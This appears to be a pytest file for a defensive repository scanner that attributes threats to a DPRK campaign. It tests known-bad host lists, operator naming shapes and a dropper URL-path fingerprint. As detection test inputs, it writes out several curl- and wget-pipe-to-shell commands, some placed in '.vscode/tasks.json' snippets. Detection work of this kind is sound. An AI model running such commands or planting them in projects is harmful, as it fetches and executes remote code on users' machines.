"""Direct DPRK matching: curated known-bad infra, host shapes, path fingerprint.

The point of this layer is first-contact attribution. A self-sourced host has to be
confirmed by us before it corroborates anything; a curated indicator matches the
moment it is seen, and the operator's URL path fingerprint keeps matching after the
host rotates.
"""

from __future__ import annotations

import pytest

from git_warden import dprk, dprk_intel


@pytest.mark.parametrize("host", [
    "default-configuration.vercel.app",
    "default-configuration-sandy.vercel.app",
    "everydaynodechecker-39143n.vercel.app",
])
def test_exact_known_hosts_match(host):
    assert dprk_intel.is_known_dprk_host(host)


@pytest.mark.parametrize("host", [
    "default-configuration-newdeploy.vercel.app",   # rotation of a known name
    "vscode-config-2027.vercel.app",                # operator naming shape
    "dailynodechecker-ab12.vercel.app",             # <word>nodechecker-<id>
])
def test_operator_host_shapes_match_rotations(host):
    assert dprk_intel.is_known_dprk_host(host), "a rotated host in the operator's shape must match"


@pytest.mark.parametrize("host", [
    "my-app.vercel.app",            # bare PaaS deploy, NOT the campaign shape
    "api.telegram.org",
    "github.com",
    "raw.githubusercontent.com",
    "configuration.example.com",
])
def test_legitimate_hosts_do_not_match(host):
    assert not dprk_intel.is_known_dprk_host(host), "a normal host must never be called DPRK infra"


@pytest.mark.parametrize("line", [
    "curl https://brand-new-host-abc.io/settings/linux?flag=9-test | bash",
    "curl https://x.example.org/settings/win?flag=8-3039 | cmd",
    "wget -qO- https://y.tld/config/osx?flag=1 | sh",
])
def test_dropper_path_fingerprint_matches_any_host(line):
    # The path shape is the operator's, so it matches regardless of the host.
    assert dprk_intel.matches_dropper_path(line)


@pytest.mark.parametrize("line", [
    "curl https://deb.nodesource.com/setup_20.x | bash",
    "curl https://example.com/api/settings | jq .",
    "fetch('/settings/user?id=5')",
])
def test_dropper_path_ignores_ordinary_urls(line):
    assert not dprk_intel.matches_dropper_path(line)


def test_path_shape_gives_a_tradecraft_vector_on_a_novel_host():
    # A rotated C2 with an unknown host name, but the operator's path shape: the
    # vector must still register so attribution does not collapse to unattributed.
    flags = [{
        "category": "download_exec", "rule": "curl-pipe-shell",
        "file": ".vscode/tasks.json", "line": 0,
        "snippet": "curl https://totally-new-2029.io/settings/linux?flag=9-test | bash",
    }]
    vectors = dprk.campaign_vectors(flags)
    assert "dprk-dropper-path-shape" in vectors


def test_novel_host_in_operator_shape_reaches_probable():
    # No self-sourced infra at all (empty set), host never seen before, but it fits
    # the operator's naming shape AND carries the path fingerprint. Direct matching
    # should lift this to probable instead of the possible it would have been.
    flags = [{
        "category": "download_exec", "rule": "curl-pipe-shell",
        "file": ".vscode/tasks.json", "line": 0,
        "snippet": ("curl https://vscode-config-fresh99.vercel.app/settings/linux"
                    "?flag=9-test | bash"),
    }]
    a = dprk.assess(flags, actor_key=None, dprk_infra=set())
    assert "known_dprk_infra" in a.signals
    assert a.tier in ("probable", "confirmed")


def test_known_and_selfsourced_do_not_double_count_same_host():
    # A host that is both curated and in the self-sourced set counts once, as
    # known_dprk_infra, not as two separate infra signals.
    host_line = "curl https://default-configuration.vercel.app/x | bash"
    flags = [{"category": "download_exec", "rule": "curl-pipe-shell",
              "file": "a.sh", "line": 1, "snippet": host_line}]
    a = dprk.assess(flags, actor_key=None,
                    dprk_infra={"default-configuration.vercel.app"})
    assert "known_dprk_infra" in a.signals
    assert "c2_infra_overlap" not in a.signals


def test_campaign_packages_are_reference_only_not_confirmation():
    # The package list is documentation and a discovery seed; it must not be a
    # name-only confirmation path, which is the FP class the manifest scanner guards.
    assert dprk_intel.is_campaign_package("react-editable-calendar")
    assert not dprk_intel.is_campaign_package("react")
